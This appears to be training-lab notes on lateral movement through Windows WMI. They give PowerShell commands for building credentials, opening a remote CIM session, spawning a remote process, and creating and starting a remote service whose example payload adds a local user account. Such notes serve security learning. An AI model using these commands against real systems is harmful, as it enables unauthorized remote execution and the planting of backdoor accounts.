WMI is Windows implementation of Web-Based Enterprise Management (WBEM), an enterprise standard for accessing management information across devices. 

In simpler terms, WMI allows administrators to perform standard management tasks that attackers can abuse to perform lateral movement in various ways.<br>

**Connecting to WMI From Powershell**<br>

Before being able to connect to WMI using Powershell commands, we need to create a PSCredential object with our user and password.
This object will be stored in the $credential variable and utilised throughout the techniques on this task:
```python
$username = 'Administrator';
$password = 'Mypass123';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
```
There are two protocols when establishing a WMI session **DCOM** and **Wsman**.<br>
To establish a WMI session from Powershell, we can use the following commands and store the session on the $Session variable, which we will use directry.<br>
```python
$Opt = New-CimSessionOption -Protocol DCOM
$Session = New-Cimsession -ComputerName TARGET -Credential $credential -SessionOption $Opt -ErrorAction Stop
```
**Remote Process Creation Using WMI**<br>
We can remotely spawn a process from Powershell by leveraging WMI, sending a WMI request to the Win32_Process class to spawn the process under the session we created before:
```python
$Command = "powershell.exe -Command Set-Content -Path C:\text.txt -Value lol";
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $Command}
```
**Creating Services Remotely with WMI**<br>
We can create services with WMI through Powershell. To create a service called LOLService, we can use the following command:
```python
Invoke-CimMethod -CimSession $Session -ClassName Win32_Service -MethodName Create -Arguments @{
Name = "LOLService";
DisplayName = "LOLService";
PathName = "net user lol Pass123 /add"; # Your payload
ServiceType = [byte]::Parse("16"); # Win32OwnProcess : Start service in a new process
StartMode = "Manual"
}
```
And then, we can get a handle on the service and start it with the following commands:

```python
$Service = Get-CimInstance -CimSession $Session -ClassName Win32_Service -filter "Name LIKE 'LOLservice'"
Invoke-CimMethod -InputObject $Service -MethodName StartService
```
Finally, we can stop and delete the service with the following commands:
```
Invoke-CimMethod -InputObject $Service -MethodName StopService
Invoke-CimMethod -InputObject $Service -MethodName Delete
```




















































